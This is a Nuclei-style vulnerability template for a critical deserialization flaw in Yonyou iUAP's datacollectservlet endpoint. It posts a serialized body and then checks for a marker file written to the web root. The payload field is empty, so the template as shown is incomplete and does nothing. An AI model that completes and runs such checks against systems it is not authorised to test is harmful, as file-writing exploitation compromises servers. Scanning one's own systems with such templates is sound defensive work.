id: yongyou-datacollectservlet-deserialization
info:
  name: 用友 iUAP datacollectservlet 接口 - 反序列化漏洞
  author: datacollectservlet
  severity: critical
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-1387459
    vendor: yonyou
    product: iuap
  tags: deserialization,vuln,yonyou
variables:
  s3: '{{hex_decode("")}}'
flow: http(1) && http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/service/datacollectservlet'
    redirects: true
    headers:
      Content-Type: application/octet-stream
    body: |
      {{s3}}
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
  - method: GET
    path:
      - '{{BaseURL}}/asdcfghzxxdsacsaekj.txt'
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "asdcfghzxxdsacsaekjdsasdadsadwa")'
